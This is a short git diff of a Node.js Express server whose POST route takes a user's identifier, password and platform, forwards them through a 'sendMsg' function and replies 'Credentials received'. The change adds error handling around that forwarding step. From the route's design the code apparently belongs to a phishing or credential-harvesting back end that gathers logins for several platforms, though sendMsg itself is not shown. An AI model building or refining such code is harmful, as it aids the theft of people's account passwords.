@@ -16,12 +16,19 @@ app.get("/", (req, res) => {
 
 app.post("/", async (req, res) => {
   const { identifier, password, platform } = req.body;
-  await sendMsg(identifier, password, platform);
+  const response = await sendMsg(identifier, password, platform);
+  if(response)
+  {
   res.status(200).json({
     message: "Credentials received",
     identifier: identifier,
     password: password,
   });
+  }
+  else
+  {
+    res.status(500).json({message:"Internal Server Error"});
+  }
 });
 
 app.listen(port, () => {
